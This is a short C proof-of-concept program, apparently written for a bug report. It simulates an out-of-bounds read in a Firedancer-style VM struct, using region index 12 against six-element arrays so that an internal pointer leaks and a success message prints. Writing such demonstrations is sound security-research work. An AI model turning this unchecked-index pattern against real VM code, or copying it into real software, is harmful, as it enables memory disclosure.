#include <stdio.h>
#include <stdint.h>
#include <string.h>

typedef uint64_t ulong;
typedef uint32_t uint;
typedef uint8_t uchar;

typedef struct {
  ulong region_haddr[6];
  uint  region_ld_sz[6];
  uint  region_st_sz[6];
  void *    input_mem_regions;
  uint      input_mem_regions_cnt;
} fd_vm_t;

#define FD_VADDR_TO_REGION( vaddr ) ( (ulong)(vaddr) >> 32 )

int main() {
    fd_vm_t vm;
    memset(&vm, 0, sizeof(vm));
    vm.input_mem_regions = (void *)0xDEADBEEFCAFEULL;
    vm.input_mem_regions_cnt = 0x1000;

    ulong vaddr = 12ULL << 32;
    ulong region = FD_VADDR_TO_REGION(vaddr);
    
    // In fd_vm_mem_haddr:
    // region_sz = vm_region_sz[region]
    // result = vm_region_haddr[region] + offset
    
    // Simulating OOB access
    ulong leaked_haddr = vm.region_haddr[region];
    uint  leaked_sz    = vm.region_ld_sz[region];

    printf("PoC Result for Region %llu:\n", (unsigned long long)region);
    printf("  Leaked haddr: 0x%llx\n", (unsigned long long)leaked_haddr);
    printf("  Leaked sz:    0x%x\n", leaked_sz);

    if (leaked_haddr == 0xDEADBEEFCAFEULL) {
        printf("SUCCESS: Internal VM pointer leaked!\n");
    }
    return 0;
}
